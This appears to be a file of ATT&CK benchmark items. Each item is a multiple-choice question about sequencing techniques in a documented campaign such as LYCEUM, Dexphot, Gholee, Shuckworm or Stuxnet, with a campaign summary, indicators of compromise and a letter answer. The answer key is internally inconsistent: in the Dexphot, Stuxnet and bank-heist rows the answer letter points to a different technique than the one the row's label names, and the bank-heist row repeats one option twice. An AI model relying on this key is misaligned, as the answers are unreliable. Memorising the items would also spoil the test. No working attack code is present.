1121,24,24-Discovery-T1087-Account Discovery,Which ATT&CK technique most likely occurred after LYCEUM gained additional access from credentials gathered via Decrypt-RDCMan.ps1 and before targeting HR and IT personnel with spearphishing emails to acquire information for further operational planning?,T1087-Account Discovery,T1497-Virtualization/Sandbox Evasion,T1133-External Remote Services,T1212-Exploitation for Credential Access,"Initial Access: The LYCEUM threat group gained initial access to organizations by using account credentials obtained through password spraying or brute-force attacks. They then sent spearphishing emails with malicious Excel attachments to deliver the DanBot malware.
Execution: LYCEUM executed the DanBot malware, a first-stage remote access trojan (RAT) that uses DNS and HTTP-based communication mechanisms. The malware provides basic remote access capabilities, including the ability to execute arbitrary commands via cmd.exe and to upload and download files. Additionally, the group used a PowerShell-based keylogger (kl.ps1), a script to decrypt passwords from the RDCMan configuration file (Decrypt-RDCMan.ps1), and a script to gather account information from Active Directory (Get-LAPSP.ps1).
Defense Evasion: LYCEUM utilized DanDrop, a VBA macro embedded in an Excel XLS file, to drop the DanBot malware. They made incremental improvements to obfuscate the macro and refactor some of the functionality to evade defenses.
Credential Access: LYCEUM deployed tools such as Decrypt-RDCMan.ps1 to decrypt passwords stored in the RDCMan configuration file and Get-LAPSP.ps1 to gather account information from Active Directory, which could provide additional access within the environment.
Command and Control: LYCEUM registered new domains for individual campaigns, which were typically used within a few weeks of registration. These domains, suspected to be part of LYCEUM's command and control infrastructure, often had a security or web technology theme.
Others: The LYCEUM threat group has been active since at least April 2018, targeting critical infrastructure organizations in the Middle East, particularly in the oil and gas sector. They have demonstrated capabilities similar to other threat groups operating in the region, such as COBALT GYPSY and COBALT TRINITY. Secureworks Counter Threat Unit researchers recommend implementing multi-factor authentication, increasing visibility via endpoint detection, response, and logging, conducting preparedness exercises, and reinforcing phishing awareness to mitigate the threat posed by LYCEUM.",A
907,218,218-Defense Evasion-T1055-Process Injection,"After leveraging obfuscated batch scripts to evade antivirus detection and employing living-off-the-land techniques, which ATT&CK technique most likely occurred before Dexphot wrote five key files to disk for execution by targeting legitimate system processes?",T1574.002-DLL Side-Loading,T1218.008-Odbcconf,T1053-Scheduled Task/Job,T1055-Process Injection,"Execution: The Dexphot attack, first detected in October 2018, involved a complex execution stage where it wrote five key files to disk: an installer with two URLs, an MSI package file, a password-protected ZIP archive, a loader DLL, and an encrypted data file containing three additional executables. These executables were loaded into system processes via process hollowing, targeting legitimate system processes such as msiexec.exe, unzip.exe, rundll32.exe, schtasks.exe, and powershell.exe, and later svchost.exe, tracert.exe, and setup.exe.
Persistence: Dexphot ensured persistence through dual monitoring services that checked the status of all three malicious processes and re-infected the device if any were terminated. It also used schtasks.exe to create scheduled tasks for updates and re-infection, employing techniques like Scheduled Task and Signed Binary Proxy Execution. The tasks called msiexec.exe as a proxy to run the malicious code and updated Dexphot's components upon system reboot and every 90 or 110 minutes while the system was running.
Others: Microsoft Defender ATP Research Team, led by Hazel Kim, closely monitored the Dexphot threat for over a year, observing its evolution and the attackers' efforts to upgrade the malware, target new processes, and work around defensive measures. Microsoft Defender ATP's behavioral blocking and containment capabilities were crucial in stopping the Dexphot campaign. The team's insights into the goals and motivations of Dexphot's authors contributed to a broader understanding of cybercriminal behavior.",C
403,151,151-Defense Evasion-T1622-Debugger Evasion,"After the malicious Excel file prompted the victim to enable Macro content and executed the payload using ShellExecute under cmd.exe and Rundll32, which ATT&CK technique most likely occurred before the malware established mechanisms to hide from debuggers such as Ollydbg and IDA?",T1566-Phishing,T1207-Rogue Domain Controller,T1622-Debugger Evasion,T1033-System Owner/User Discovery,"Initial Access: The Gholee malware campaign utilized a spear phishing attack with a malicious Excel file named 'Operation Protective Edge.xlsb' (MD5: d0c3f4c9896d41a7c42737134ffb4c2e) to gain initial access to the victim's computer. The file, first uploaded to Virus Total on August 10, 2014, from Israel, was not initially detected as malicious by any antivirus engines. On August 19, 2014, it was detected by Kaspersky as Trojan-Dropper.MSExcel.Agent.ce.
Execution: Upon enabling Macro content in the malicious Excel file, the victim is presented with a message that disappears to show different content. The Macro code uses ASCII character codes to avoid detection and concatenates them into a single variable within a function. These functions are then combined to create a single PE file, which is saved as NTUSER.data.{GUIDE}.dll (MD5: 48573a150562c57742230583456b4c02) and executed using ShellExecute under cmd.exe /C and Rundll32 to hide the process.
Command and Control: The Gholee malware establishes command and control by communicating with a Kuwait-based IP address (83.170.33.60) owned by German company iABG Mbh. It opens an SSL connection over port 443 using an expired digital certificate issued to Core Security for *coreimpactagent.net by Thawte certificate authority. The certificate fingerprint is MD5: 9C 80 C2 47 40 6D 6C ED FC E0 08 AEEF D9 98 90. The malware's HTTP communication pattern includes GET and POST requests to /index.php with specific parameters.
Others: Related incidents reveal another file 'svchost 67.exe' (MD5: 916be1b609ed3dc80e5039a1d8102e82) uploaded to Virus Total on June 2, 2014, from Latvia, which communicated with an IP address (83.170.33.37) in the same netblock as the Gholee malware. Detection and prevention measures include disabling macro code via GPO, blocking files containing macro code at the email gateway, and monitoring logs and proxy servers for communication with the malware-associated IP addresses. A Yara rule is provided for detecting the Gholee malware.",C
876,212,212-Defense Evasion-T1574-Hijack Execution Flow,"After gaining initial access via email delivery of a Gh0st RAT sample, which ATT&CK technique most likely occurred before ASERT identified the reuse of long-standing C2 domains such as etybh[.]com in the Musical Chairs campaign?",T1006-Direct Volume Access,T1137.004-Outlook Home Page,T1566-Phishing,T1574-Hijack Execution Flow,"Initial Access: The actors behind the Musical Chairs campaign have been observed delivering a new sample of Gh0st RAT via email, consistent with their documented tactics. Artifacts provided by malware-traffic-analysis.net indicate the use of email as a delivery mechanism.
Execution: The actors have transitioned from using BAT and JS files in the infection process to employing DLL side-loading techniques. A signed executable is used to load a malicious DLL, which then launches the actual Gh0st DLL.
Command and Control: ASERT has discovered new command-and-control infrastructure associated with the Musical Chairs campaign. The actors are known for the longevity of their C2 domains, reusing them even after identification. A new domain, etybh[.]com, has been registered and is expected to be used in new intrusions. The domain shares the same IP and registrar with previously known C2 domains yourbroiler[.]com and meitanjiaoyiwang[.]com.
Others: ASERT has amended a previous blog post to remove an incorrect association with the APT group responsible for the Night Dragon campaign. The correction was made following input from the research team at Palo Alto Networks.",D
1761,320,320-Command and Control-T1071-Application Layer Protocol,"After deploying multiple variants of their custom VBS backdoor and executing VBS scripts for potential data collection, which ATT&CK technique most likely occurred to establish communication with Shuckworm's servers and download additional payloads?",T1071-Application Layer Protocol,T1571-Non-Standard Port,T1053.007-Container Orchestration Job,T1053-Scheduled Task/Job,"Initial Access: The attack chain initiated by Shuckworm against a Ukrainian organization began on July 14, 2021, with the opening of a malicious document, likely delivered via phishing email. The document contained a custom backdoor known as Pterodo, which was executed using a suspicious command.
Execution: Following the initial compromise, Shuckworm executed various VBS scripts and HTA files to maintain their presence and execute their backdoor. They also created scheduled tasks to ensure persistence and executed commands via scripts. On July 16, additional variants of Pterodo were executed, and on July 28, a VNC client was installed as the ultimate payload for the attack.
Persistence: Shuckworm established persistence by creating scheduled tasks that executed malicious VBS files every few minutes. These tasks ensured that their backdoor would remain active even after system reboots.
Defense Evasion: Shuckworm utilized mshta.exe to bypass application control solutions and browser security settings. They also used scheduled tasks and VBS scripts to evade detection and maintain their foothold.
Collection: Between July 29 and August 18, Shuckworm deployed multiple variants of their custom VBS backdoor and executed VBS scripts. It is unclear if the documents accessed during this period were part of the attackers' efforts to collect and exfiltrate sensitive information.
Others: Symantec's Threat Hunter Team, part of Broadcom Software, has been tracking Shuckworm's cyber-espionage activities against Ukraine. Shuckworm, also known as Gamaredon or Armageddon, has been active since at least 2013 and has recently increased the sophistication of their attacks. The Security Service of Ukraine (SSU) reported that Shuckworm has been using living-off-the-land tools to steal credentials and move laterally on victim networks. Symantec's investigation revealed seven files used by Shuckworm in their attacks, all of which are 7-zip SFX self-extracting binaries. These files included various VBS files, a VNC client, and a Process Explorer binary. The IOCs from the investigation showed patterns such as C&C IPs belonging to a short list of hosting providers and suspected malicious files found in specific directories with names starting with the letter 'd'. The SSU report from November 2021 attributed over 5,000 attacks to Shuckworm since 2014, targeting more than 1,500 Ukrainian government systems.",A
681,185,185-Lateral Movement-T1210-Exploitation of Remote Services,"Which ATT&CK technique most likely occurred after Stuxnet propagated through the network using the MS08-067 RPC vulnerability and the MS10-061 Print Spooler vulnerability to infect other systems, but before it began communicating with command and control (C&C) servers through encrypted HTTP connections?",T1210-Exploitation of Remote Services,T1021.007-Cloud Services,T1068-Exploitation for Privilege Escalation,T1132.001-Standard Encoding,"Initial Access: The Stuxnet worm exploited the CVE-2010-2568 vulnerability to gain initial access to systems. This vulnerability was related to the way Windows displayed shortcut icons. Stuxnet used malicious .LNK files that, when viewed, would automatically execute the malware without user interaction. The worm specifically targeted SCADA systems, but its propagation method allowed it to spread widely. The initial infection vector was through removable drives, such as USB flash drives, which contained the malicious .LNK files and two TMP files (~WTR4141.TMP and ~WTR4132.TMP). The .LNK files were crafted to load the ~WTR4141.TMP file, which in turn would load and execute the ~WTR4132.TMP file, leading to the infection of the host machine.
Execution: Stuxnet's execution phase involved running malicious code on both local and remote systems. The worm's main module, a DLL packed with UPX, contained multiple resources including two kernel-mode drivers (MrxCls.sys and MrxNet.sys) and additional user-mode components. These drivers were responsible for injecting code into processes and hiding files used for propagation. Stuxnet also replaced legitimate system files with malicious versions to maintain persistence and control over infected systems. The malware executed exported functions from its main module to perform various tasks, such as building and running its dropper, spreading through the network, and communicating with command and control (C&C) servers.
Persistence: Stuxnet achieved persistence by installing kernel-mode drivers and user-mode components onto infected systems. It used a boot start service to ensure its kernel-mode driver (MrxCls.sys) was loaded early in the OS boot process. The driver injected code into specific processes and monitored system behavior to maintain control. Additionally, Stuxnet modified system files and registry keys to ensure it was executed upon system startup.
Privilege Escalation: Stuxnet utilized two zero-day vulnerabilities, MS10-073 and MS10-092, to escalate privileges on infected systems. The MS10-073 vulnerability in the win32k.sys system module allowed Stuxnet to execute arbitrary code with SYSTEM privileges by loading a specially crafted keyboard layout file. The MS10-092 vulnerability in the Windows Task Scheduler Service enabled Stuxnet to elevate its privileges up to SYSTEM level by manipulating the metadata of scheduled tasks. The worm used these elevated privileges to perform actions that would otherwise be restricted.
Defense Evasion: Stuxnet employed multiple techniques to evade detection and analysis. It used rootkit functionality to hide its presence on infected systems, including hiding files and injecting code into processes. The worm also utilized stolen digital certificates to sign its kernel-mode drivers, making them appear as legitimate software components. Additionally, Stuxnet patched system libraries and hooked functions to load non-existent libraries, reducing the likelihood of detection by heuristic methods.
Command and Control: Stuxnet communicated with C&C servers using HTTP. It encrypted its communications and sent data to predefined URLs, which included both decoy URLs (such as www.windowsupdate.com) and actual C&C server URLs (such as www.mypremierfutbol.com). The worm's C&C protocol involved sending system information and receiving commands or updates. Stuxnet also implemented an RPC server for peer-to-peer communication, allowing it to receive updates from other infected machines on the network.",C
2428,398,398-Lateral Movement-T1550-Use Alternate Authentication Material,"After leveraging the bank's established connectivity with the processor's network for reconnaissance of the card processing service, which ATT&CK technique most likely occurred before the attackers used credentials to navigate laterally into the processor's network?",T1548.003-Sudo and Sudo Caching,T1550-Use Alternate Authentication Material,T1072-Software Deployment Tools,T1550-Use Alternate Authentication Material,"Initial Access: The cybercriminal network behind the attack recruited individuals, referred to as 'mules', to open new bank accounts using counterfeit documents likely provided by the network. These mules then requested debit/ATM cards for the new accounts, which were later distributed outside the country for subsequent fraudulent use. The attackers gained initial entry into the bank's network through opportunistic phishing emails to employees, which led to the creation of backdoors on compromised systems. Social engineering techniques were also employed to obtain backdoor access.
Execution: The attackers executed several malicious payloads on the processor's network, including the installation of a legitimate monitoring tool, 'Mipko' (advertised as 'Employee Monitor'), on the processor's Terminal Server. This tool captured full information, including screen captures and keystrokes, for all users who logged into the system and accessed the card management application.
Privilege Escalation: After gaining initial access to the bank's network, the attackers leveraged control weaknesses in the Windows network to launch lateral movement attacks, obtain 'Keys to the Kingdom', and compromise the bank network. They also compromised the Enterprise Admin account on the processor's network, which gave them full access to the infrastructure.
Defense Evasion: Attackers adopted the tactic of 'living off the land', using legitimate Windows and PowerShell commands combined with tools such as PSExec for lateral movement, and plink.exe to access RDP over an established SSH tunnel. They also used commercial monitoring applications and 'Cobalt Strike Beacon' to maintain backdoor connections.
Credential Access: The attackers identified bank employee accounts on the card management application with authorization to request and approve changes to customer debit cards. They used these credentials to manipulate the cards associated with the rogue accounts created earlier.
Command and Control: The attackers coordinated ATM withdrawals across multiple cities and countries, using command and control with physical mules for coordinated cash outs. They carefully planned the choice of ATM locations based on criteria such as location, degree of physical security, and the ability to dispense substantial amounts of cash.
Impact: The attackers manipulated the bank's internal systems to enable high overdraft levels and removed anti-fraud controls for specific accounts. They then used the manipulated debit cards to perform cash withdrawals from various ATMs, removing up to USD$10 million from each bank. The final stage of the operation took almost five hours to complete, with simultaneous debit card withdrawals across the geographic region.",C